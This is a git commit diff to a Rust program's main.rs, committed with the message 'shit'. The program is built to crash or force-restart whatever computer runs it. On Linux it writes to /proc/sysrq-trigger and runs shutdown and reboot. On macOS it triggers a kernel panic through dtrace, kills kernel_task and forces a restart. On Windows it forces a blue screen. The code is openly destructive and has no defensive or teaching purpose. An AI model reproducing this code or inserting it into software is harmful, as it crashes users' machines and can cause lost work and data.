9718ff351d28047d2df20c1bad2a4f2ac9eddd75
fooooooooooooooo <34515228+fooooooooooooooo@users.noreply.github.com>
2024-08-02 21:32:55 -0700

    shit

--- src/main.rs
+++ src/main.rs
@@ -1,15 +1,34 @@
 fn main() {
   #[cfg(target_os = "linux")]
-  sysrq_trigger();
+  kill_linux();
+  #[cfg(target_os = "macos")]
+  kill_macos();
   #[cfg(target_os = "windows")]
   bsod::bsod();
 }
 
 #[cfg(target_os = "linux")]
-fn sysrq_trigger() {
+fn kill_linux() {
   use std::fs::File;
   use std::io::Write;
+  use std::process::Command;
+
   if let Ok(mut f) = File::create("/proc/sysrq-trigger") {
     let _ = f.write_all(b"l");
   }
+  let _ = Command::new("shutdown").arg("-r").arg("now").output();
+  let _ = Command::new("reboot").output();
+}
+
+#[cfg(target_os = "macos")]
+fn kill_macos() {
+  use std::process::Command;
+  let _ = Command::new("dtrace")
+    .arg("-w")
+    .arg("-n")
+    .arg("BEGIN{ panic();}")
+    .output();
+  let _ = Command::new("killall").arg("kernel_task").output();
+  let _ = Command::new("shutdown").arg("-r").arg("now").output();
+  let _ = Command::new("reboot").output();
 }
